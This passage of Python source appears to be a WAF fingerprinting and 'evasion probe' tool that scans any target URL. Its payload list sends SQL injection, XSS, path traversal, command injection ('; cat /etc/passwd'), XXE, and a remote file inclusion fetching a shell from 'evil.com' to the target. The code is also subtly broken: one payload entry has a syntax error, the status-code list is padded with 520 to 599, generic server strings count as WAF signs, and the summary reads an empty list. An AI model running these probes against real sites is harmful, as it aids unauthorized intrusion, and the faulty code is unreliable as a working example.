        ),
        WAFSignature(
            name="TIWAP",
            vendor="TIWAP",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="tiwap",
            case_sensitive=False,
            description="TIWAP WAF headers."
        ),
        WAFSignature(
            name="TrueShield",
            vendor="TrueShield",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="trueshield",
            case_sensitive=False,
            description="TrueShield WAF headers."
        ),
        WAFSignature(
            name="USP Shield",
            vendor="USP",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="uspshield",
            case_sensitive=False,
            description="USP Shield WAF headers."
        ),
        WAFSignature(
            name="Varnish WAF",
            vendor="Varnish",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="varnish",
            case_sensitive=False,
            description="Varnish WAF headers."
        ),
        WAFSignature(
            name="Veil Security",
            vendor="Veil Security",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="veil",
            case_sensitive=False,
            description="Veil Security WAF headers."
        ),
        WAFSignature(
            name="VulnScan",
            vendor="VulnScan",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="vulnscan",
            case_sensitive=False,
            description="VulnScan WAF headers."
        ),
        WAFSignature(
            name="Wallarm",
            vendor="Wallarm",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="wallarm",
            case_sensitive=False,
            description="Wallarm WAF headers."
        ),
        WAFSignature(
            name="WatchGuard",
            vendor="WatchGuard",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="watchguard",
            case_sensitive=False,
            description="WatchGuard WAF headers."
        ),
        WAFSignature(
            name="WebARX",
            vendor="WebARX",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="webarx",
            case_sensitive=False,
            description="WebARX WAF headers."
        ),
        WAFSignature(
            name="WebKnight Pro",
            vendor="AQTRONIX",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="webknightpro",
            case_sensitive=False,
            description="WebKnight Pro WAF headers."
        ),
        WAFSignature(
            name="WebRoot",
            vendor="WebRoot",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="webroot",
            case_sensitive=False,
            description="WebRoot WAF headers."
        ),
        WAFSignature(
            name="Webramp",
            vendor="Webramp",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="webramp",
            case_sensitive=False,
            description="Webramp WAF headers."
        ),
        WAFSignature(
            name="Webtrends",
            vendor="Webtrends",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="webtrends",
            case_sensitive=False,
            description="Webtrends WAF headers."
        ),
        WAFSignature(
            name="West263",
            vendor="West263",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="west263",
            case_sensitive=False,
            description="West263 WAF headers."
        ),
        WAFSignature(
            name="WTS WAF",
            vendor="WTS",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="wts",
            case_sensitive=False,
            description="WTS WAF headers."
        ),
        WAFSignature(
            name="XCMSCMS",
            vendor="XCMS",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="xcms",
            case_sensitive=False,
            description="XCMS WAF headers."
        ),
        WAFSignature(
            name="Yundun NGFW",
            vendor="Yundun",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="yundun ngfw",
            case_sensitive=False,
            description="Yundun Next-Gen Firewall headers."
        ),
        WAFSignature(
            name="Zenedge Pro",
            vendor="Zenedge",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="zenedgepro",
            case_sensitive=False,
            description="Zenedge Pro WAF headers."
        ),
        WAFSignature(
            name="ZScaler Enterprise",
            vendor="Zscaler",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="zscaler enterprise",
            case_sensitive=False,
            description="Zscaler Enterprise WAF headers."
        ),
    ]
    
    # Common WAF challenge page patterns
    CHALLENGE_PATTERNS = [
        r"<title>Just a moment\.\.\.</title>",
        r"Checking if the site connection is secure",
        r"Cloudflare Ray ID:",
        r"Under attack!",
        r"cf-browser-verification",
        r"__cf_chl_jschl_tk__",
        r"jschl-answer",
        r"captcha\.php",
        r"challenge-platform",
        r"welcome-to-cloudflare",
        r"cloudflare-challenge",
        r"akamai-origin-server",
        r"bigipserver",
        r"incap_ses",
        r"cp_cpn_id",
        r"x-amzn-requestid",
        r"x-amzn-trace-id",
        r"x-amzn-edge-lambda",
        r"server: nginx",
        r"server: apache",
        r"powered by wordpress",
        r"wp-content",
        r"wp-includes",
    ]
    
    # Common WAF status codes
    WAF_STATUS_CODES = [403, 406, 408, 429, 503, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599]
    
    # Common WAF response headers
    WAF_HEADERS = [
        "server",
        "x-powered-by",
        "x-frame-options",
        "x-xss-protection",
        "x-content-type-options",
        "strict-transport-security",
        "content-security-policy",
        "content-security-policy-report-only",
        "x-content-security-policy",
        "x-webkit-csp",
        "x-aspnet-version",
        "x-generator",
        "x-aspnetmvc-version",
        "x-mstr-etag",
        "x-servedby",
        "x-varnish",
        "x-cache",
        "x-proxy-cache",
        "x-fastly-request-id",
        "x-amz-cf-id",
        "x-amz-request-id",
        "x-amz-id-2",
        "x-amzn-requestid",
        "x-amzn-trace-id",
        "cf-ray",
        "cf-cache-status",
        "cf-request-id",
        "cf-worker",
        "nel",
        "report-to",
        "alt-s",
        "cache-control",
        "pragma",
        "expires",
        "age",
        "via",
        "proxy-authenticate",
        "proxy-authorization",
        "te",
        "trailers",
        "transfer-encoding",
        "upgrade",
        "warning",
        "www-authenticate",
        "accept-ch",
        "accept-ch-lc",
        "sec-ch-ua",
        "sec-ch-ua-mobile",
        "sec-ch-ua-platform",
        "sec-fetch-dest",
        "sec-fetch-mode",
        "sec-fetch-site",
        "sec-fetch-user",
        "sec-gpc",
        "viewport-width",
        "width",
        "device-memory",
        "downlink",
        "ect",
        "rtt",
        "save-data",
    ]
    
    def __init__(self, target: str, timeout: int = 10, max_threads: int = 5, verbose: bool = False):
        """
        Initialize the WAF Detector.
        
        Args:
            target: Target URL to scan
            timeout: Request timeout in seconds
            max_threads: Maximum number of concurrent threads
            verbose: Enable verbose logging
        """
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.max_threads = max_threads
        self.verbose = verbose
        
        # Parse the base URL
        parsed = urlparse(target)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"
        self.path = parsed.path or '/'
        self.query_string = parsed.query
        
        # Session for persistent connections
        self.session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Results storage
        self.probe_results: List[ProbeResult] = []
        self.waf_profiles: List[WAFProfile] = []
        self.detected_wafs: Set[str] = set()
        self.detection_methods_used: Set[DetectionMethod] = set()
        
        # Logging setup
        if verbose:
            logger.setLevel(logging.DEBUG)
            for handler in logger.handlers:
                handler.setLevel(logging.DEBUG)
        
        logger.info(f"Initialized WAF Detector for target: {self.target}")
    
    def _make_request(self, url: str, method: str = "GET", 
                      headers: Optional[Dict[str, str]] = None,
                      data: Optional[Dict[str, str]] = None,
                      params: Optional[Dict[str, str]] = None,
                      timeout: Optional[int] = None) -> Tuple[requests.Response, float]:
        """
        Make an HTTP request and measure response time.
        
        Args:
            url: Request URL
            method: HTTP method
            headers: Additional headers
            data: Request body data
            params: Query parameters
            timeout: Request timeout
            
        Returns:
            Tuple of (response object, response time in seconds)
        """
        start_time = time.time()
        try:
            response = self.session.request(
                method=method,
                url=url,
                headers=headers or {},
                data=data,
                params=params,
                timeout=timeout or self.timeout,
                allow_redirects=True,
                verify=False  # Disable SSL verification for testing
            )
            end_time = time.time()
            response_time = end_time - start_time
            return response, response_time
        except requests.exceptions.RequestException as e:
            end_time = time.time()
            response_time = end_time - start_time
            # Create a minimal response object for error cases
            class MockResponse:
                def __init__(self, error_msg: str, status_code: int = 0):
                    self.status_code = status_code
                    self.headers = {}
                    self.text = error_msg
                    self.content = error_msg.encode('utf-8') if isinstance(error_msg, str) else error_msg
                    self.reason = error_msg
                    self.url = url
                    self.request = type('Request', (), {'method': method})()
            
            mock_response = MockResponse(str(e))
            return mock_response, response_time
    
    def _check_header_signatures(self, response: requests.Response) -> List[WAFSignature]:
        """
        Check response headers against known WAF signatures.
        
        Args:
            response: HTTP response object
            
        Returns:
            List of matched WAF signatures
        """
        matched_signatures = []
        all_headers = dict(response.headers)
        
        # Combine all header values into a single string for searching
        header_text = ' '.join([f"{k}: {v}" for k, v in all_headers.items()]).lower()
        
        for signature in self.KNOWN_SIGNATURES:
            if signature.type_ == DetectionMethod.HEADER_SIGNATURE:
                if signature.matches(header_text):
                    matched_signatures.append(signature)
                    if self.verbose:
                        logger.debug(f"Matched header signature: {signature.name}")
        
        return matched_signatures
    
    def _check_body_signatures(self, response: requests.Response) -> List[WAFSignature]:
        """
        Check response body against known WAF signatures.
        
        Args:
            response: HTTP response object
            
        Returns:
            List of matched WAF signatures
        """
        matched_signatures = []
        try:
            body_text = response.text.lower()
        except:
            body_text = ""
        
        for signature in self.KNOWN_SIGNATURES:
            if signature.type_ == DetectionMethod.BODY_SIGNATURE:
                if signature.matches(body_text):
                    matched_signatures.append(signature)
                    if self.verbose:
                        logger.debug(f"Matched body signature: {signature.name}")
        
        return matched_signatures
    
    def _check_status_codes(self, response: requests.Response) -> bool:
        """
        Check if response status code indicates WAF intervention.
        
        Args:
            response: HTTP response object
            
        Returns:
            True if status code suggests WAF involvement
        """
        return response.status_code in self.WAF_STATUS_CODES
    
    def _check_challenge_pages(self, response: requests.Response) -> bool:
        """
        Check if response contains WAF challenge page content.
        
        Args:
            response: HTTP response object
            
        Returns:
            True if challenge page detected
        """
        try:
            body_text = response.text
        except:
            body_text = ""
        
        for pattern in self.CHALLENGE_PATTERNS:
            if pattern.startswith("<"):
                # Direct string match
                if pattern in body_text:
                    return True
            else:
                # Regex match
                import re
                if re.search(pattern, body_text, re.IGNORECASE | re.DOTALL):
                    return True
        
        return False
    
    def _detect_rate_limiting(self, target_url: str, num_requests: int = 10, 
                             delay: float = 0.1) -> bool:
        """
        Detect rate limiting by sending multiple rapid requests.
        
        Args:
            target_url: URL to test
            num_requests: Number of requests to send
            delay: Delay between requests in seconds
            
        Returns:
            True if rate limiting detected
        """
        if self.verbose:
            logger.info(f"Testing rate limiting with {num_requests} requests...")
        
        status_codes = []
        for i in range(num_requests):
            response, _ = self._make_request(target_url, method="GET")
            status_codes.append(response.status_code)
            if delay > 0:
                time.sleep(delay)
        
        # Check if any request received a WAF-like status code
        waf_codes = [code for code in status_codes if code in self.WAF_STATUS_CODES]
        rate_limited = len(waf_codes) > 0
        
        if rate_limited and self.verbose:
            logger.warning(f"Rate limiting detected! Status codes: {Counter(status_codes)}")
        
        return rate_limited
    
    def _detect_ip_blocking(self, target_url: str, user_agents: Optional[List[str]] = None) -> bool:
        """
        Detect IP blocking by changing User-Agent and checking for different responses.
        
        Args:
            target_url: URL to test
            user_agents: List of User-Agent strings to test
            
        Returns:
            True if IP blocking suspected
        """
        if user_agents is None:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
                "Mozilla/5.0 (Android 11; Mobile) AppleWebKit/537.36",
            ]
        
        if self.verbose:
            logger.info(f"Testing IP blocking with {len(user_agents)} User-Agents...")
        
        responses = []
        for ua in user_agents:
            headers = {"User-Agent": ua}
            response, _ = self._make_request(target_url, method="GET", headers=headers)
            responses.append({
                'ua': ua[:50],
                'status': response.status_code,
                'headers': dict(response.headers)
            })
        
        # Check if responses vary significantly based on User-Agent
        status_codes = [r['status'] for r in responses]
        unique_statuses = set(status_codes)
        
        # If all responses are the same, no IP blocking likely
        # If responses differ, there might be UA-based filtering
        ip_blocked = len(unique_statuses) > 1 and len(unique_statuses) < len(user_agents)
        
        if ip_blocked and self.verbose:
            logger.warning(f"Possible IP/UA blocking detected: {Counter(status_codes)}")
        
        return ip_blocked
    
    def _analyze_response_time_anomalies(self, target_url: str, num_samples: int = 20) -> bool:
        """
        Analyze response time patterns for WAF behavior.
        
        Args:
            target_url: URL to test
            num_samples: Number of samples to collect
            
        Returns:
            True if response time anomalies suggest WAF
        """
        if self.verbose:
            logger.info(f"Analyzing response times with {num_samples} samples...")
        
        response_times = []
        for _ in range(num_samples):
            _, response_time = self._make_request(target_url, method="GET")
            response_times.append(response_time)
        
        if not response_times:
            return False
        
        # Calculate statistics
        avg_time = sum(response_times) / len(response_times)
        max_time = max(response_times)
        min_time = min(response_times)
        
        # High variance or consistently slow responses may indicate WAF processing
        variance = sum((t - avg_time) ** 2 for t in response_times) / len(response_times)
        std_dev = variance ** 0.5
        
        # WAFs often add consistent overhead or variable delays
        waf_indicated = (std_dev > 0.1) or (avg_time > 1.0)
        
        if waf_indicated and self.verbose:
            logger.info(f"Response time analysis: Avg={avg_time:.3f}s, StdDev={std_dev:.3f}s")
        
        return waf_indicated
    
    def _probe_common_payloads(self, target_url: str) -> List[ProbeResult]:
        """
        Probe with common WAF-evasion payloads.
        
        Args:
            target_url: Base URL to test
            
        Returns:
            List of probe results
        """
        if self.verbose:
            logger.info("Probing with common payloads...")
        
        payloads = [
            # SQL Injection attempts
            {"name": "SQL Injection - Union", "payload": "' UNION SELECT NULL--", "param": "id"},
            {"name": "SQL Injection - Boolean", "payload": "' OR 1=1--", "param": "id"},
            {"name": "SQL Injection - Time-Based", "payload": "' AND SLEEP(5)--", "param": "id"},
            
            # XSS attempts
            {"name": "XSS - Script Tag", "payload": "<script>alert(1)</script>", "param": "q"},
            {"name": "XSS - Event Handler", "payload": "javascript:alert(1)", "param": "url"},
            {"name": "XSS - Img Tag", "payload": "<img src=x onerror=alert(1)>", "param": "search"},
            
            # Path Traversal
            {"name": "Path Traversal", "payload": "../../../etc/passwd", "param": "file"},
            {"name": "Path Traversal Encoded", "payload": "..%2f..%2f..%2fetc%2fpasswd", "param": "file"},
            
            # Command Injection
            {"name": "Command Injection", "payload"; "; cat /etc/passwd", "param": "cmd"},
            {"name": "Command Injection Pipe", "payload": "| ls -la", "param": "cmd"},
            
            # LFI/RFI
            {"name": "Local File Inclusion", "payload": "php://filter/convert.base64-encode/resource=index.php", "param": "page"},
            {"name": "Remote File Inclusion", "payload": "http://evil.com/shell.txt", "param": "page"},
            
            # XML External Entity
            {"name": "XXE - Entity", "payload": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", "param": "xml"},
            
            # JSON Injection
            {"name": "JSON Injection", "payload": '{"user": "admin", "role": "admin"}', "param": "json"},
            
            # Header Injection
            {"name": "Header Injection", "payload": "value\\r\\nX-Injected: true", "param": "header"},
            
            # Unicode Encoding
            {"name": "Unicode Encoding", "payload": "\u0022\u0027", "param": "test"},
            
            # Double URL Encoding
            {"name": "Double URL Encoding", "payload": "%2522%2527", "param": "test"},
            
            # Null Byte Injection
            {"name": "Null Byte Injection", "payload": "%00", "param": "file"},
            
            # Comment Injection
            {"name": "Comment Injection", "payload": "--", "param": "comment"},
            
            # Whitespace Variations
            {"name": "Whitespace Variation", "payload": "%20%20OR%20%201%20=%201", "param": "id"},
            {"name": "Tab Character", "payload": "%09OR%091%09=%091", "param": "id"},
            {"name": "Newline Character", "payload": "%0aOR%0a1%0a=%0a1", "param": "id"},
            {"name": "Carriage Return", "payload": "%0dOR%0d1%0d=%0d1", "param": "id"},
        ]
        
        probe_results = []
        
        for payload_info in payloads:
            payload_name = payload_info['name']
            payload_value = payload_info['payload']
            param_name = payload_info['param']
            
            # Construct URL with payload
            if self.query_string:
                base_url = f"{self.base_url}{self.path}?{self.query_string}&{param_name}={quote_plus(payload_value)}"
            else:
                base_url = f"{self.base_url}{self.path}?{param_name}={quote_plus(payload_value)}"
            
            response, response_time = self._make_request(base_url, method="GET")
            
            # Determine if this payload was blocked/detected
            detected = False
            detection_method = DetectionMethod.STATUS_CODE
            
            if response.status_code in self.WAF_STATUS_CODES:
                detected = True
                detection_method = DetectionMethod.STATUS_CODE
            elif self._check_challenge_pages(response):
                detected = True
                detection_method = DetectionMethod.CHALLENGE_PAGE
            elif self._check_header_signatures(response) or self._check_body_signatures(response):
                detected = True
                detection_method = DetectionMethod.HEADER_SIGNATURE
            
            # Create probe result
            result = ProbeResult(
                test_name=payload_name,
                payload=payload_value,
                url=base_url,
                method="GET",
                status_code=response.status_code,
                headers=dict(response.headers),
                body_snippet=response.text[:500] if hasattr(response, 'text') else "",
                response_time=response_time,
                detected=detected,
                detection_method=detection_method,
                details={"original_url": f"{self.base_url}{self.path}", "param": param_name}
            )
            
            probe_results.append(result)
            
            if self.verbose:
                status_icon = "🚫" if detected else "✅"
                logger.debug(f"{status_icon} [{payload_name}] Status: {response.status_code}, Detected: {detected}")
        
        return probe_results
    
    def _build_waf_profile(self, matched_signatures: List[WAFSignature], 
                          rate_limited: bool, ip_blocked: bool, 
                          challenge_detected: bool, response_anomalies: bool) -> WAFProfile:
        """
        Build a comprehensive WAF profile from detection results.
        
        Args:
            matched_signatures: List of matched signatures
            rate_limited: Whether rate limiting was detected
            ip_blocked: Whether IP blocking was detected
            challenge_detected: Whether challenge pages were detected
            response_anomalies: Whether response time anomalies were found
            
        Returns:
            WAFProfile object
        """
        # Aggregate detected WAF names
        waf_names = list(set(sig.name for sig in matched_signatures))
        
        # Calculate confidence score
        total_checks = 10  # Arbitrary total number of checks
        positive_checks = len(matched_signatures) + (1 if rate_limited else 0) + \
                         (1 if ip_blocked else 0) + (1 if challenge_detected else 0) + \
                         (1 if response_anomalies else 0)
        confidence = min(1.0, positive_checks / total_checks)
        
        # Collect detection methods
        methods = set()
        if matched_signatures:
            methods.add(DetectionMethod.HEADER_SIGNATURE)
            methods.add(DetectionMethod.BODY_SIGNATURE)
        if rate_limited:
            methods.add(DetectionMethod.RATE_LIMITING)
        if ip_blocked:
            methods.add(DetectionMethod.IP_BLOCKING)
        if challenge_detected:
            methods.add(DetectionMethod.CHALLENGE_PAGE)
        if response_anomalies:
            methods.add(DetectionMethod.RESPONSE_TIME_ANOMALY)
        
        # Determine primary WAF name
        primary_waf = waf_names[0] if waf_names else "Unknown WAF"
        
        profile = WAFProfile(
            waf_name=primary_waf,
            confidence=confidence,
            detection_methods=list(methods),
            signatures_matched=[sig.name for sig in matched_signatures],
            behavioral_traits=[],
            rate_limit_detected=rate_limited,
            ip_blocking_detected=ip_blocked,
            challenge_page_detected=challenge_detected,
            response_headers={}
        )
        
        if rate_limited:
            profile.behavioral_traits.append("Rate Limiting Enabled")
        if ip_blocked:
            profile.behavioral_traits.append("IP Blocking Enabled")
        if challenge_detected:
            profile.behavioral_traits.append("Challenge Pages Enabled")
        if response_anomalies:
            profile.behavioral_traits.append("Response Time Anomalies Detected")
        
        return profile
    
    def run_full_scan(self) -> Dict[str, Any]:
        """
        Execute the full WAF detection scan.
        
        Returns:
            Dictionary containing scan results
        """
        if self.verbose:
            logger.info("Starting full WAF scan...")
        
        start_time = time.time()
        
        # Step 1: Baseline request
        baseline_response, baseline_time = self._make_request(self.target, method="GET")
        
        if self.verbose:
            logger.info(f"Baseline request completed in {baseline_time:.3f}s")
        
        # Step 2: Check header signatures
        header_matches = self._check_header_signatures(baseline_response)
        if self.verbose:
            logger.info(f"Header signature matches: {len(header_matches)}")
        
        # Step 3: Check body signatures
        body_matches = self._check_body_signatures(baseline_response)
        if self.verbose:
            logger.info(f"Body signature matches: {len(body_matches)}")
        
        # Step 4: Check status codes
        status_indication = self._check_status_codes(baseline_response)
        if self.verbose:
            logger.info(f"Status code indicates WAF: {status_indication}")
        
        # Step 5: Check challenge pages
        challenge_detected = self._check_challenge_pages(baseline_response)
        if self.verbose:
            logger.info(f"Challenge page detected: {challenge_detected}")
        
        # Step 6: Behavioral analysis
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_rate_limit = executor.submit(self._detect_rate_limiting, self.target)
            future_ip_block = executor.submit(self._detect_ip_blocking, self.target)
            future_response_time = executor.submit(self._analyze_response_time_anomalies, self.target)
            
            rate_limited = future_rate_limit.result()
            ip_blocked = future_ip_block.result()
            response_anomalies = future_response_time.result()
        
        # Step 7: Payload probing
        payload_results = self._probe_common_payloads(self.target)
        
        # Step 8: Build WAF profile
        all_matches = header_matches + body_matches
        waf_profile = self._build_waf_profile(
            matched_signatures=all_matches,
            rate_limited=rate_limited,
            ip_blocked=ip_blocked,
            challenge_detected=challenge_detected,
            response_anomalies=response_anomalies
        )
        
        # Compile final results
        elapsed_time = time.time() - start_time
        
        results = {
            "target": self.target,
            "scan_duration_seconds": round(elapsed_time, 3),
            "waf_detected": len(all_matches) > 0 or status_indication or challenge_detected,
            "waf_profile": waf_profile.to_dict(),
            "baseline_request": {
                "status_code": baseline_response.status_code,
                "response_time": round(baseline_time, 3),
                "headers": dict(baseline_response.headers),
                "body_snippet": baseline_response.text[:500] if hasattr(baseline_response, 'text') else ""
            },
            "header_signatures_matched": [sig.name for sig in header_matches],
            "body_signatures_matched": [sig.name for sig in body_matches],
            "status_code_indicates_waf": status_indication,
            "challenge_page_detected": challenge_detected,
            "rate_limiting_detected": rate_limited,
            "ip_blocking_detected": ip_blocked,
            "response_time_anomalies": response_anomalies,
            "payload_probes": [
                {
                    "name": pr.test_name,
                    "status_code": pr.status_code,
                    "detected": pr.detected,
                    "detection_method": pr.detection_method.value,
                    "response_time": round(pr.response_time, 3)
                }
                for pr in payload_results
            ],
            "detection_methods_used": [m.value for m in waf_profile.detection_methods],
            "confidence_score": round(waf_profile.confidence * 100, 2)
        }
        
        if self.verbose:
            logger.info(f"Scan completed in {elapsed_time:.3f}s")
            logger.info(f"WAF Detected: {results['waf_detected']}")
            logger.info(f"Confidence: {results['confidence_score']}%")
            logger.info(f"WAF Name: {waf_profile.waf_name}")
        
        return results
    
    def get_summary(self) -> str:
        """
        Generate a human-readable summary of the scan results.
        
        Returns:
            Formatted summary string
        """
        if not self.waf_profiles:
            return "No WAF profiles generated yet. Run a scan first."
        
        profile = self.waf_profiles[0]
        summary_lines = [
            "=" * 60,
            "WAF DETECTION SCAN SUMMARY",
            "=" * 60,
            f"Target: {self.target}",
            f"WAF Detected: {'Yes' if profile.confidence > 0.5 else 'No'}",
            f"Primary WAF: {profile.waf_name}",
            f"Confidence: {profile.confidence * 100:.1f}%",
            "-" * 60,
            "Detection Methods Used:",
        ]
        
        for method in profile.detection_methods:
            summary_lines.append(f"  - {method.value}")
        
        summary_lines.extend([
            "-" * 60,
            "Behavioral Traits:",
        ])
        
        if profile.behavioral_traits:
            for trait in profile.behavioral_traits:
                summary_lines.append(f"  - {trait}")
        else:
            summary_lines.append("  - None detected")
        
        summary_lines.extend([
            "-" * 60,
            "Signatures Matched:",
        ])
        
        if profile.signatures_matched:
            for sig in profile.signatures_matched:
                summary_lines.append(f"  - {sig}")
        else:
            summary_lines.append("  - None")
        
        summary_lines.extend([
            "=" * 60,
        ])
        
        return '\n'.join(summary_lines)


def main():
    """Main entry point for the WAF detector script."""
    parser = argparse.ArgumentParser(
        description="WAF/IDS/IPS Signature & Heuristic Behavioral Evasion Probe",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python waf_detector.py --target https://example.com
  python waf_detector.py --target https://example.com --timeout 15 --threads 10
  python waf_detector.py --target https://example.com --verbose --output results.json
        """
    )
    
    parser.add_argument(
        '--target', '-t',
        required=True,
        help='Target URL to scan (e.g., https://example.com)'
    )
    parser.add_argument(
        '--timeout', '-T',
        type=int,
        default=10,
        help='Request timeout in seconds (default: 10)'
    )
    parser.add_argument(
        '--threads', '-th',
        type=int,
        default=5,
        help='Maximum number of concurrent threads (default: 5)'
    )
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Enable verbose logging'
    )
    parser.add_argument(
        '--output', '-o',
        type=str,
        help='Output file path for JSON results'
    )
    parser.add_argument(
        '--json',
        action='store_true',
        help='Output results as JSON only'
    )
    
    args = parser.parse_args()
    
    # Initialize detector
    detector = WAFDetector(
        target=args.target,
        timeout=args.timeout,
        max_threads=args.threads,
        verbose=args.verbose
    )
    
    # Run scan
    results = detector.run_full_scan()
    
    # Output results
    if args.json or args.output:
        output_json = json.dumps(results, indent=2, default=str)
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(output_json)
            logger.info(f"Results saved to: {args.output}")
        if args.json:
            print(output_json)
    else:
        print(detector.get_summary())
        print("\nDetailed JSON Results:")
        print(json.dumps(results, indent=2, default=str))


if __name__ == "__main__":
    main()
